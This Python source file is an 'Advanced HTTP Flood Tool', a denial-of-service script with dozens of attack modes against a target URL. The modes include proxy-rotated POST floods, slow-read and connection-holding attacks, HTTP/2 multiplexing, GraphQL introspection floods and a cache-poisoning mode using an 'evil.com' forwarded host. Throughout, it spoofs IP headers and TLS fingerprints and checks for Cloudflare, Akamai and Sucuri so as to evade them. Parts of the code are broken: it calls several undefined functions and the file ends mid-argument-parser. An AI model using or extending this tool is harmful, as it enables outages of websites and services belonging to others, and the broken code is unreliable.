import argparse
import asyncio
import random
import uuid
import time
import aiohttp
import socket
import json
import base64
import hashlib
import collections
from rich import print
from colorama import Fore, Style, init
from tls_client import Session
from rich.live import Live
from rich.table import Table
from rich.console import Console
from urllib.parse import urlparse
from aiohttp_socks import ProxyConnector
import httpx
import re

init(autoreset=True)

# Internal list of user-agents for faster performance
USER_AGENTS = []
try:
    with open("ua_real_dump.txt") as f:
        USER_AGENTS = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    USER_AGENTS = ["Mozilla/5.0"]  # fallback

def generate_user_agent():
    return random.choice(USER_AGENTS)

# Function to generate random headers
def generate_headers(target, profile=None):
    header_presets = [
        lambda: {
            'User-Agent': generate_user_agent(),
            'X-Forwarded-For': '.'.join(str(random.randint(0, 255)) for _ in range(4)),
            'Referer': 'https://bing.com/search?q=' + str(uuid.uuid4()),
            'Cache-Control': 'no-cache',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        },
        lambda: {
            'User-Agent': generate_user_agent(),
            'X-Requested-With': 'XMLHttpRequest',
            'Connection': 'keep-alive'
        },
        lambda: {
            'User-Agent': "Googlebot/2.1 (+http://www.google.com/bot.html)",
            'From': 'googlebot(at)google.com'
        }
    ]

    headers = random.choice(header_presets)()
    headers = mutate_headers(headers, target)
    headers["Referer"] = random.choice([
        "https://google.com/search?q=" + uuid.uuid4().hex,
        "https://news.ycombinator.com/",
        f"{target}/docs",
        f"{target}/login"
    ])
    headers.update({
        "Sec-CH-UA": '"Chromium";v="114", "Not.A/Brand";v="8"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"',
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-User": "?1"
    })
    headers["Cookie"] = f"_vercel_jwt={uuid.uuid4().hex}; session={uuid.uuid4().hex}"
    if profile:
        if profile == "seo":
            headers['User-Agent'] = "Googlebot/2.1"
        elif profile == "mobile":
            headers['User-Agent'] = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
    return headers

# Function to mutate headers for stealth
def mutate_headers(headers, target):
    parsed = urlparse(target)
    host = parsed.netloc
    headers['Host'] = host
    headers['X-Real-IP'] = '.'.join(str(random.randint(1, 254)) for _ in range(4))
    headers['X-Originating-IP'] = headers['X-Real-IP']
    headers['X-Forwarded-Proto'] = random.choice(['http', 'https'])
    headers['Alt-Svc'] = f"h3=\":{random.choice([443, 8443, 2096])}\""
    return headers

# Function to load proxies from string
def load_proxies(proxy_str):
    return [proxy.strip() for proxy in proxy_str.split(',')]

# Function to detect WAF
async def detect_waf(session, url):
    try:
        async with session.get(url) as res:
            headers = res.headers
            if 'cf-ray' in headers or 'server' in headers and 'cloudflare' in headers['server'].lower():
                print(Fore.YELLOW + "[!] Cloudflare Detected")
            elif 'akamai' in str(headers).lower():
                print(Fore.YELLOW + "[!] Akamai Detected")
            elif 'sucuri' in str(headers).lower():
                print(Fore.YELLOW + "[!] Sucuri Detected")
    except Exception:
        pass

# Function to validate proxies
async def validate_proxy(proxy):
    try:
        connector = ProxyConnector.from_url(proxy)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get("http://httpbin.org/ip", timeout=5) as res:
                return res.status == 200
    except:
        return False

# TLS Spoofing Function (Synchronous)
def tls_spoof_post_sync(url, headers, data, target):
    session = get_random_tls_session(target)
    session.headers.update(headers)
    return session.post(url, data=data)

# TLS Spoofing Function (Asynchronous)
async def tls_spoof_post(url, headers, data, target):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, partial(tls_spoof_post_sync, url, headers, data, target))

# Obfuscated Payload for Ghost Attack
def nextjs_payload():
    return json.dumps({
        "__N_SSG": True,
        "props": {
            "pageProps": {
                "auth": uuid.uuid4().hex,
                "locale": random.choice(["en", "fr", "es"]),
                "config": {"id": uuid.uuid4().hex}
            }
        }
    })

# Safe POST request with retry logic
async def safe_post(session, url, **kwargs):
    retry_queue = asyncio.Queue()
    for _ in range(3):
        try:
            response = await session.post(url, **kwargs)
            return response
        except:
            await retry_queue.put((url, kwargs))
            await asyncio.sleep(0.2)
    while not retry_queue.empty():
        url, kwargs = await retry_queue.get()
        try:
            await session.post(url, **kwargs)
        except:
            pass

# Prewarming Fingerprint
async def prewarm_fingerprint(session, target):
    try:
        await session.get(f"{target}/favicon.ico")
        await session.get(f"{target}/_next/static/chunks/main.js")
        await session.get(f"{target}/robots.txt")
    except:
        pass

# Smart Flood Mutation
async def smart_flood_mutation(target, proxies, threads, use_tls=False):
    random.shuffle(proxies)
    tasks = []
    for _ in range(threads):
        task = asyncio.create_task(http_flood(target, proxies, use_tls))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def http_flood(target, proxies, use_tls):
    global total_requests, proxy_success, proxy_fail
    while True:
        proxy_url = random.choice(proxies)
        connector = ProxyConnector.from_url(proxy_url)
        async with aiohttp.ClientSession(connector=connector) as session:
            headers = generate_headers(target)
            data = nextjs_payload()
            start = time.time()
            try:
                async with safe_post(session, target, headers=headers, data=data) as post_response:
                    status_code = post_response.status
                    latency = round((time.time() - start) * 1000)
                    print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {connector}")
                    if status_code < 400:
                        proxy_success += 1
                    else:
                        proxy_fail += 1
                    total_requests += 1
                    if latency > 500 or status_code in (403, 429):
                        if proxy_url in proxies and len(proxies) > 3:
                            proxies.remove(proxy_url)
            except Exception as e:
                print(f"[red]Error: {str(e)}")

            await asyncio.sleep(smart_jitter())

# Exploit-aware Chaining Mode
async def exploit_chaining_mode(target, proxies, threads, use_tls=False):
    random.shuffle(proxies)
    tasks = []
    for _ in range(threads):
        task = asyncio.create_task(http_flood_exploit(target, proxies, use_tls))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def http_flood_exploit(target, proxies, use_tls):
    global total_requests, proxy_success, proxy_fail
    while True:
        proxy_url = random.choice(proxies)
        connector = ProxyConnector.from_url(proxy_url)
        async with aiohttp.ClientSession(connector=connector) as session:
            headers = generate_headers(target)
            data = nextjs_payload()
            start = time.time()
            try:
                await flood_chain(session, target, headers)
                status_code = 200  # Assume success for chained requests
                latency = round((time.time() - start) * 1000)
                print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {connector}")
                if status_code < 400:
                    proxy_success += 1
                else:
                    proxy_fail += 1
                total_requests += 1
                if latency > 500 or status_code in (403, 429):
                    if proxy_url in proxies and len(proxies) > 3:
                        proxies.remove(proxy_url)
            except Exception as e:
                print(f"[red]Error: {str(e)}")

            await asyncio.sleep(smart_jitter())

async def flood_chain(session, target, headers):
    await session.get(f"{target}/api/preview?id={uuid.uuid4().hex}", headers=headers)
    await session.post(f"{target}/api/feedback", headers=headers, data=nextjs_payload())
    await session.get(f"{target}/_next/data/{uuid.uuid4().hex}.json?page=home", headers=headers)

# Adaptive Ghost Mutation Engine
async def adaptive_ghost_mutation(target, proxies, threads, use_tls=False):
    random.shuffle(proxies)
    tasks = []
    for _ in range(threads):
        task = asyncio.create_task(http_flood_adaptive(target, proxies, use_tls))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def http_flood_adaptive(target, proxies, use_tls):
    global total_requests, proxy_success, proxy_fail
    request_count = 0
    while True:
        proxy_url = random.choice(proxies)
        connector = ProxyConnector.from_url(proxy_url)
        async with aiohttp.ClientSession(connector=connector) as session:
            headers = generate_headers(target)
            data = nextjs_payload()
            start = time.time()
            try:
                async with safe_post(session, target, headers=headers, data=data) as post_response:
                    status_code = post_response.status
                    latency = round((time.time() - start) * 1000)
                    print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {connector}")
                    if status_code < 400:
                        proxy_success += 1
                    else:
                        proxy_fail += 1
                    total_requests += 1
                    request_count += 1
                    if request_count % 5 == 0:
                        data = base64.b64encode(data.encode()).decode()
                        data = json.dumps({'nested': data})
                    if latency > 500 or status_code in (403, 429):
                        if proxy_url in proxies and len(proxies) > 3:
                            proxies.remove(proxy_url)
            except Exception as e:
                print(f"[red]Error: {str(e)}")

            await asyncio.sleep(smart_jitter())

# AI-Bypass Header Synthesis
async def ai_bypass_header_synthesis(target, proxies, threads, use_tls=False):
    random.shuffle(proxies)
    tasks = []
    for _ in range(threads):
        task = asyncio.create_task(http_flood_ai_bypass(target, proxies, use_tls))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def http_flood_ai_bypass(target, proxies, use_tls):
    global total_requests, proxy_success, proxy_fail
    while True:
        proxy_url = random.choice(proxies)
        connector = ProxyConnector.from_url(proxy_url)
        async with aiohttp.ClientSession(connector=connector) as session:
            headers = generate_headers(target)
            data = nextjs_payload()
            start = time.time()
            try:
                headers['User-Agent'] = random.choice(USER_AGENTS)
                headers['Accept-Language'] = random.choice(['en-US', 'fr-FR', 'es-ES'])
                headers['Sec-Fetch-Site'] = random.choice(['none', 'same-origin', 'same-site'])
                headers['Sec-Fetch-Mode'] = random.choice(['navigate', 'same-origin', 'no-cors', 'cors'])
                headers['Sec-Fetch-Dest'] = random.choice(['document', 'empty', 'image', 'script', 'style', 'font', 'report', 'object', 'embed'])
                async with safe_post(session, target, headers=headers, data=data) as post_response:
                    status_code = post_response.status
                    latency = round((time.time() - start) * 1000)
                    print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {connector}")
                    if status_code < 400:
                        proxy_success += 1
                    else:
                        proxy_fail += 1
                    total_requests += 1
                    if latency > 500 or status_code in (403, 429):
                        if proxy_url in proxies and len(proxies) > 3:
                            proxies.remove(proxy_url)
            except Exception as e:
                print(f"[red]Error: {str(e)}")

            await asyncio.sleep(smart_jitter())

# Real-Time Fingerprint Spoofer (TLS + JA3)
async def tls_fingerprint_rotate(target, proxies, threads, use_tls=False):
    random.shuffle(proxies)
    tasks = []
    for _ in range(threads):
        task = asyncio.create_task(http_flood_tls_fingerprint(target, proxies, use_tls))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def http_flood_tls_fingerprint(target, proxies, use_tls):
    global total_requests, proxy_success, proxy_fail
    while True:
        proxy_url = random.choice(proxies)
        connector = ProxyConnector.from_url(proxy_url)
        async with aiohttp.ClientSession(connector=connector) as session:
            headers = generate_headers(target)
            data = nextjs_payload()
            start = time.time()
            try:
                client_identifiers = ["chrome_112", "firefox_109", "safari_16", "edge_109"]
                client_identifier = random.choice(client_identifiers)
                resp = await tls_spoof_post(target, headers, data, target)
                status_code = resp.status_code
                latency = round((time.time() - start) * 1000)
                print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {connector}")
                if status_code < 400:
                    proxy_success += 1
                else:
                    proxy_fail += 1
                total_requests += 1
                if latency > 500 or status_code in (403, 429):
                    if proxy_url in proxies and len(proxies) > 3:
                        proxies.remove(proxy_url)
            except Exception as e:
                print(f"[red]Error: {str(e)}")

            await asyncio.sleep(smart_jitter())

# Proxy Score Autobalancer
async def proxy_score_autobalancer(target, proxies, threads, use_tls=False):
    random.shuffle(proxies)
    tasks = []
    for _ in range(threads):
        task = asyncio.create_task(http_flood_proxy_balancer(target, proxies, use_tls))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def http_flood_proxy_balancer(target, proxies, use_tls):
    global total_requests, proxy_success, proxy_fail
    while True:
        proxy_url = random.choice(proxies)
        connector = ProxyConnector.from_url(proxy_url)
        async with aiohttp.ClientSession(connector=connector) as session:
            headers = generate_headers(target)
            data = nextjs_payload()
            start = time.time()
            try:
                async with safe_post(session, target, headers=headers, data=data) as post_response:
                    status_code = post_response.status
                    latency = round((time.time() - start) * 1000)
                    print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {connector}")
                    if status_code < 400:
                        proxy_success += 1
                    else:
                        proxy_fail += 1
                    total_requests += 1
                    if latency > 500:
                        threads -= 1
                    else:
                        threads += 1
                    if latency > 500 or status_code in (403, 429):
                        if proxy_url in proxies and len(proxies) > 3:
                            proxies.remove(proxy_url)
            except Exception as e:
                print(f"[red]Error: {str(e)}")

            await asyncio.sleep(smart_jitter())

# WAF Reaction Simulator
async def waf_reaction_simulator(target, proxies, threads, use_tls=False):
    random.shuffle(proxies)
    tasks = []
    for _ in range(threads):
        task = asyncio.create_task(http_flood_waf_simulator(target, proxies, use_tls))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def http_flood_waf_simulator(target, proxies, use_tls):
    global total_requests, proxy_success, proxy_fail
    while True:
        proxy_url = random.choice(proxies)
        connector = ProxyConnector.from_url(proxy_url)
        async with aiohttp.ClientSession(connector=connector) as session:
            headers = generate_headers(target)
            data = nextjs_payload()
            start = time.time()
            try:
                async with session.options(target, headers=headers) as options_response:
                    if options_response.status != 200:
                        continue
                async with session.head(target, headers=headers) as head_response:
                    if head_response.status != 200:
                        continue
                async with safe_post(session, target, headers=headers, data=data) as post_response:
                    status_code = post_response.status
                    latency = round((time.time() - start) * 1000)
                    print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {connector}")
                    if status_code < 400:
                        proxy_success += 1
                    else:
                        proxy_fail += 1
                    total_requests += 1
                    if latency > 500 or status_code in (403, 429):
                        if proxy_url in proxies and len(proxies) > 3:
                            proxies.remove(proxy_url)
            except Exception as e:
                print(f"[red]Error: {str(e)}")

            await asyncio.sleep(smart_jitter())

# Attack Log Replay
async def attack_log_replay(target, proxies, threads, use_tls, replay_mode):
    random.shuffle(proxies)
    tasks = []
    for _ in range(threads):
        task = asyncio.create_task(http_flood_log_replay(target, proxies, use_tls, replay_mode))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def http_flood_log_replay(target, proxies, use_tls, replay_mode):
    global total_requests, proxy_success, proxy_fail
    logged_payloads = load_logged_payloads('successful_payloads.log' if replay_mode == "successful" else 'failed_payloads.log')
    while True:
        proxy_url = random.choice(proxies)
        connector = ProxyConnector.from_url(proxy_url)
        async with aiohttp.ClientSession(connector=connector) as session:
            payload = random.choice(logged_payloads)
            headers = generate_headers(target)
            data = payload['data']
            start = time.time()
            try:
                async with safe_post(session, target, headers=headers, data=data) as post_response:
                    status_code = post_response.status
                    latency = round((time.time() - start) * 1000)
                    print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {connector}")
                    if status_code < 400:
                        proxy_success += 1
                    else:
                        proxy_fail += 1
                    total_requests += 1
                    if latency > 500 or status_code in (403, 429):
                        if proxy_url in proxies and len(proxies) > 3:
                            proxies.remove(proxy_url)
            except Exception as e:
                print(f"[red]Error: {str(e)}")

            await asyncio.sleep(smart_jitter())

# Stealth Resonance Mode
async def stealth_resonance_flood(target, proxies, threads, use_tls):
    random.shuffle(proxies)
    tasks = []
    for _ in range(threads):
        task = asyncio.create_task(http_flood_stealth_resonance(target, proxies, use_tls))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def http_flood_stealth_resonance(target, proxies, use_tls):
    global total_requests, proxy_success, proxy_fail
    while True:
        proxy_url = random.choice(proxies)
        connector = ProxyConnector.from_url(proxy_url)
        async with aiohttp.ClientSession(connector=connector) as session:
            headers = generate_headers(target)
            data = nextjs_payload()
            start = time.time()
            try:
                async with safe_post(session, target, headers=headers, data=data) as post_response:
                    status_code = post_response.status
                    latency = round((time.time() - start) * 1000)
                    print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {connector}")
                    if status_code < 400:
                        proxy_success += 1
                    else:
                        proxy_fail += 1
                    total_requests += 1
                    if latency > 500 or status_code in (403, 429):
                        if proxy_url in proxies and len(proxies) > 3:
                            proxies.remove(proxy_url)
            except Exception as e:
                print(f"[red]Error: {str(e)}")

            await asyncio.sleep(smart_jitter())

# Reverse-Choke Injection
async def reverse_choke_flood(target, proxies, threads, use_tls):
    random.shuffle(proxies)
    tasks = []
    for _ in range(threads):
        task = asyncio.create_task(http_flood_reverse_choke(target, proxies, use_tls))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def http_flood_reverse_choke(target, proxies, use_tls):
    global total_requests, proxy_success, proxy_fail
    while True:
        proxy_url = random.choice(proxies)
        connector = ProxyConnector.from_url(proxy_url)
        async with aiohttp.ClientSession(connector=connector) as session:
            headers = generate_headers(target)
            try:
                async with session.post(target, headers=headers, data=nextjs_payload(), timeout=aiohttp.ClientTimeout(sock_read=15)) as resp:
                    await asyncio.sleep(random.uniform(1.5, 3.5))  # Delay hold connection
            except Exception as e:
                print(f"[RCI Error] {e}")

            await asyncio.sleep(smart_jitter())

# Logic Flood
async def logic_flood_mode(target, proxies, threads, use_tls):
    random.shuffle(proxies)
    tasks = []
    for _ in range(threads):
        task = asyncio.create_task(http_flood_logic(target, proxies, use_tls))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def http_flood_logic(target, proxies, use_tls):
    global total_requests, proxy_success, proxy_fail
    while True:
        proxy_url = random.choice(proxies)
        connector = ProxyConnector.from_url(proxy_url)
        async with aiohttp.ClientSession(connector=connector) as session:
            headers = generate_headers(target)
            try:
                res1 = await session.post(f"{target}/login", headers=headers, data=nextjs_payload())
                if res1.status == 200:
                    await session.get(f"{target}/admin/logs", headers=headers)
                    await session.post(f"{target}/api/commit", headers=headers, data=nextjs_payload())
            except Exception as e:
                print(f"[Logic Flood Error] {e}")

            await asyncio.sleep(smart_jitter())

# Slicer Mode
async def slicer_flood_mode(target, proxies, threads, use_tls):
    random.shuffle(proxies)
    tasks = []
    for _ in range(threads):
        task = asyncio.create_task(http_flood_slicer(target, proxies, use_tls))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def http_flood_slicer(target, proxies, use_tls):
    global total_requests, proxy_success, proxy_fail
    V_PATHS = ["/", "/login", "/api/feedback", "/_next/data/", "/admin", "/config", "/robots.txt"]
    while True:
        proxy_url = random.choice(proxies)
        connector = ProxyConnector.from_url(proxy_url)
        async with aiohttp.ClientSession(connector=connector) as session:
            headers = generate_headers(target)
            path = random.choice(V_PATHS)
            if path.endswith("/"):
                path += str(uuid.uuid4())
            url = target + path
            try:
                await session.get(url, headers=headers)
            except Exception as e:
                print(f"[Slicer Error] {e}")

            await asyncio.sleep(smart_jitter())

# Auto Target Capability Detection
async def detect_target_profile(session, target):
    try:
        res = await session.get(target)
        if res.status in (403, 503):
            print(Fore.RED + f"[!] Target blocking unknown agents or rate: {res.status}")
        if 'cf-ray' in res.headers or 'cloudflare' in str(res.headers).lower():
            print(Fore.YELLOW + "[!] Cloudflare Detected")
        if 'vercel' in str(res.headers).lower():
            print(Fore.YELLOW + "[!] Vercel Hosting Detected")
        if 'akamai' in str(res.headers).lower():
            print(Fore.YELLOW + "[!] Akamai Detected")
        if '/_next/' in await res.text():
            print(Fore.CYAN + "[+] Next.js Structure Detected")
    except Exception as e:
        print(Fore.RED + f"[!] Detection Failed: {e}")

# Auto Mix Flood Mode
async def auto_mix_flood(target, proxies, threads, use_tls=False):
    modes = [
        http_flood_exploit,
        http_flood_adaptive,
        http_flood_ai_bypass,
        http_flood_tls_fingerprint,
        http_flood_reverse_choke,
        http_flood_slicer
    ]
    tasks = []
    for _ in range(threads):
        flood_fn = random.choice(modes)
        task = asyncio.create_task(flood_fn(target, proxies, use_tls))
        tasks.append(task)
    await asyncio.gather(*tasks)

# HTTP/2 Flood Mode
async def http2_flood_mode(target, proxies, threads, use_tls):
    tasks = []
    for _ in range(threads):
        task = asyncio.create_task(http2_flood_client(target, generate_headers(target), nextjs_payload()))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def http2_flood_client(target, headers, data):
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        try:
            res = await client.post(target, headers=headers, data=data, timeout=10)
            print(f"[h2] Status: {res.status_code}")
        except Exception as e:
            print(f"[h2-error] {e}")

# Fragmented Payload Mode
async def chunked_payload_mode(target, proxies, threads, use_tls):
    tasks = []
    for _ in range(threads):
        proxy_url = random.choice(proxies)
        task = asyncio.create_task(chunked_payload_stream(target, proxy_url))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def chunked_payload_stream(target, proxy_url):
    connector = ProxyConnector.from_url(proxy_url)
    async with aiohttp.ClientSession(connector=connector) as session:
        headers = {
            "User-Agent": generate_user_agent(),
            "Transfer-Encoding": "chunked",
            "Content-Type": "application/json"
        }
        body = "4\r\n{\"a\":\r\n6\r\n\"b\":1}\r\n0\r\n\r\n"
        try:
            async with session.post(target, headers=headers, data=body) as res:
                print(f"[chunked] {res.status}")
        except Exception as e:
            print(f"[chunked-error] {e}")

# Multipart Form-Data Payload Flood Mode
async def multipart_flood_mode(target, proxies, threads, use_tls):
    tasks = []
    for _ in range(threads):
        proxy_url = random.choice(proxies)
        task = asyncio.create_task(multipart_flood_injector(target, proxy_url))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def multipart_flood_injector(target, proxy_url):
    connector = ProxyConnector.from_url(proxy_url)
    async with aiohttp.ClientSession(connector=connector) as session:
        form = aiohttp.FormData()
        form.add_field("username", uuid.uuid4().hex)
        form.add_field("file", b"A" * 1024, filename="payload.txt", content_type="application/octet-stream")
        headers = generate_headers(target)
        try:
            async with session.post(target, data=form, headers=headers) as res:
                print(f"[multipart] Status: {res.status}")
        except Exception as e:
            print(f"[multipart-error] {e}")

# Header Order Obfuscation Mode
async def header_order_mode(target, proxies, threads, use_tls):
    tasks = []
    for _ in range(threads):
        proxy_url = random.choice(proxies)
        headers = header_order_randomizer(generate_headers(target))
        task = asyncio.create_task(http_flood(target, [proxy_url], use_tls, headers))
        tasks.append(task)
    await asyncio.gather(*tasks)

def header_order_randomizer(headers: dict):
    keys = list(headers.keys())
    random.shuffle(keys)
    return collections.OrderedDict((k, headers[k]) for k in keys)

# Stream Upload Simulation Mode
async def stream_body_mode(target, proxies, threads, use_tls):
    tasks = []
    for _ in range(threads):
        proxy_url = random.choice(proxies)
        task = asyncio.create_task(stream_body_flood(target, proxy_url))
        tasks.append(task)
    await asyncio.gather(*tasks)

class Streamer:
    def __aiter__(self):
        self.chunks = [b"{\"key\":", b"\"value\"}", b""]
        return self

    async def __anext__(self):
        if not self.chunks:
            raise StopAsyncIteration
        await asyncio.sleep(0.5)
        return self.chunks.pop(0)

async def stream_body_flood(target, proxy_url):
    connector = ProxyConnector.from_url(proxy_url)
    async with aiohttp.ClientSession(connector=connector) as session:
        headers = generate_headers(target)
        headers['Content-Type'] = "application/json"
        try:
            async with session.post(target, data=Streamer(), headers=headers) as res:
                print(f"[stream] {res.status}")
        except Exception as e:
            print(f"[stream-error] {e}")

# Auto Endpoint Discovery Mode
async def discover_endpoints_mode(target, proxies, threads, use_tls):
    tasks = []
    for _ in range(threads):
        task = asyncio.create_task(discover_endpoints(target))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def discover_endpoints(target):
    async with aiohttp.ClientSession() as session:
        try:
            res = await session.get(target)
            html = await res.text()
            found = re.findall(r'href="(/[^"]+)"', html)
            api_paths = [p for p in found if p.startswith("/api") or "/admin" in p]
            print(f"[discover] Found endpoints: {api_paths}")
            return list(set(api_paths))
        except Exception as e:
            print(f"[discover-error] {e}")
            return []

# JA3 Fingerprint Per Proxy Mode
async def ja3_per_proxy_mode(target, proxies, threads, use_tls):
    tasks = []
    for proxy_url in proxies:
        session = get_tls_session_for_proxy(proxy_url)
        task = asyncio.create_task(http_flood(target, [proxy_url], use_tls, session))
        tasks.append(task)
    await asyncio.gather(*tasks)

def get_tls_session_for_proxy(proxy_url):
    ja3 = random.choice(JA3_FINGERPRINTS)
    s = Session(client_identifier=ja3)
    s.proxies = {"http": proxy_url, "https": proxy_url}
    return s

# HEAD/PUT Flood + Nonstandard Verb Mode
async def verb_abuse_mode(target, proxies, threads, use_tls):
    tasks = []
    for _ in range(threads):
        proxy_url = random.choice(proxies)
        task = asyncio.create_task(verb_abuse_flood(target, proxy_url))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def verb_abuse_flood(target, proxy_url):
    connector = ProxyConnector.from_url(proxy_url)
    async with aiohttp.ClientSession(connector=connector) as session:
        headers = generate_headers(target)
        try:
            await session.request("HEAD", target, headers=headers)
            await session.request("PUT", target, headers=headers, data="x=1")
            print("[verb-abuse] Sent")
        except Exception as e:
            print(f"[verb-error] {e}")

# Token Extract from JS Before Attack Mode
async def token_extract_mode(target, proxies, threads, use_tls):
    tasks = []
    for _ in range(threads):
        proxy_url = random.choice(proxies)
        task = asyncio.create_task(token_extract_and_flood(target, proxy_url))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def token_extract_and_flood(target, proxy_url):
    connector = ProxyConnector.from_url(proxy_url)
    async with aiohttp.ClientSession(connector=connector) as session:
        try:
            res = await session.get(f"{target}/_next/static/ssg-manifest.json")
            token = "dummy"
            if res.status == 200:
                txt = await res.text()
                token = re.search(r'"([a-zA-Z0-9\-_]{20,})"', txt).group(1)
            headers = generate_headers(target)
            headers["Authorization"] = f"Bearer {token}"
            data = nextjs_payload()
            async with session.post(target, headers=headers, data=data) as post_response:
                status_code = post_response.status
                print(f"[token-extract] Status: {status_code} | Token: {token}")
        except Exception as e:
            print(f"[token-extract] {e}")

# HTTP/2 Multiplexing Simulation Mode
async def h2_multiplex_mode(target, proxies, threads, use_tls):
    tasks = []
    for _ in range(threads):
        headers = generate_headers(target)
        task = asyncio.create_task(h2_multiplex_simulator(target, headers))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def h2_multiplex_simulator(target, headers):
    async with httpx.AsyncClient(http2=True) as client:
        try:
            await asyncio.gather(
                client.get(target + "/favicon.ico", headers=headers),
                client.get(target + "/api/feedback", headers=headers),
                client.post(target, headers=headers, data=nextjs_payload())
            )
            print("[h2-mux] Sent")
        except Exception as e:
            print(f"[h2-mux-error] {e}")

# Burst Layer Flood Controller
async def burst_layer_flood(target, proxies, burst_size=20, pause=2):
    async def burst_wave():
        for _ in range(burst_size):
            proxy = random.choice(proxies)
            connector = ProxyConnector.from_url(proxy)
            headers = generate_headers(target)
            async with aiohttp.ClientSession(connector=connector) as session:
                try:
                    await session.post(target, headers=headers, data=nextjs_payload())
                except:
                    pass

    while True:
        await asyncio.gather(*[asyncio.create_task(burst_wave())])
        await asyncio.sleep(pause)

# GraphQL Introspection Flood
GRAPHQL_QUERY = json.dumps({
  "query": "query IntrospectionQuery { __schema { types { name fields { name } } } }"
})

async def graphql_flood(target, proxies):
    while True:
        proxy = random.choice(proxies)
        connector = ProxyConnector.from_url(proxy)
        async with aiohttp.ClientSession(connector=connector) as session:
            try:
                await session.post(f"{target}/graphql", headers=generate_headers(target), data=GRAPHQL_QUERY)
            except:
                pass
        await asyncio.sleep(smart_jitter())

# Slow Read Emulation (client recv lambat)
async def slow_read_emulator(target, proxies):
    proxy = random.choice(proxies)
    connector = ProxyConnector.from_url(proxy)
    async with aiohttp.ClientSession(connector=connector) as session:
        try:
            async with session.get(target, headers=generate_headers(target)) as resp:
                while True:
                    chunk = await resp.content.read(1)
                    if not chunk:
                        break
                    await asyncio.sleep(0.3)  # sengaja lambat terima
        except:
            pass

# Redirect Chain Stressor
async def redirect_stressor(target, proxies):
    redirect_path = "/redirect?url=https://google.com"  # bisa diubah
    proxy = random.choice(proxies)
    connector = ProxyConnector.from_url(proxy)
    async with aiohttp.ClientSession(connector=connector) as session:
        try:
            await session.get(target + redirect_path, headers=generate_headers(target), allow_redirects=True)
        except:
            pass

# Cache Poison Chain (CDN destroyer)
async def cache_poison_flood(target, proxies):
    proxy = random.choice(proxies)
    connector = ProxyConnector.from_url(proxy)
    headers = generate_headers(target)
    headers.update({
        "X-Forwarded-Host": "evil.com",
        "X-Cache-Key": str(uuid.uuid4()),
        "X-Origin-Cache-Control": "no-store"
    })
    async with aiohttp.ClientSession(connector=connector) as session:
        try:
            await session.get(target, headers=headers)
        except:
            pass

# Auto Mix Overload Flood
async def auto_mix_overload_flood(target, proxies, threads):
    overload_modes = [
        burst_layer_flood,
        graphql_flood,
        slow_read_emulator,
        redirect_stressor,
        cache_poison_flood,
        http_flood_exploit,
        http_flood_tls_fingerprint,
        http2_flood_client,
        http_flood_multipart,
        http_flood_chunked,
    ]

    tasks = []
    for _ in range(threads):
        mode_fn = random.choice(overload_modes)
        task = asyncio.create_task(mode_fn(target, proxies))
        tasks.append(task)

    await asyncio.gather(*tasks)

# Main Function
async def main(target, proxies, threads, mode, use_tls, replay_mode):
    global total_requests, proxy_success, proxy_fail
    total_requests = 0
    proxy_success = 0
    proxy_fail = 0

    modes = [
        smart_flood_mutation,
        exploit_chaining_mode,
        adaptive_ghost_mutation,
        ai_bypass_header_synthesis,
        tls_fingerprint_rotate,
        proxy_score_autobalancer,
        waf_reaction_simulator,
        attack_log_replay,
        lambda: prewarm_fingerprint(aiohttp.ClientSession(), target),
        stealth_resonance_flood,
        reverse_choke_flood,
        logic_flood_mode,
        slicer_flood_mode,
        detect_target_profile,
        auto_mix_flood,
        http2_flood_mode,
        chunked_payload_mode,
        multipart_flood_mode,
        header_order_mode,
        stream_body_mode,
        discover_endpoints_mode,
        ja3_per_proxy_mode,
        verb_abuse_mode,
        token_extract_mode,
        h2_multiplex_mode,
        burst_layer_flood,
        graphql_flood,
        slow_read_emulator,
        redirect_stressor,
        cache_poison_flood,
        auto_mix_overload_flood
    ]

    tasks = []
    for mode_fn in modes:
        if isinstance(mode_fn, types.FunctionType):
            task = asyncio.create_task(mode_fn(target, proxies, threads, use_tls, replay_mode))
        else:
            task = asyncio.create_task(mode_fn(target, proxies, threads, use_tls))
        tasks.append(task)

    await asyncio.gather(*tasks)

    print(f"[yellow]Total Requests: {total_requests}")
    print(f"[green]Successful Requests: {proxy_success}")
    print(f"[red]Failed Requests: {proxy_fail}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced HTTP Flood Tool")
    parser.add_argument("target", help="Target URL")
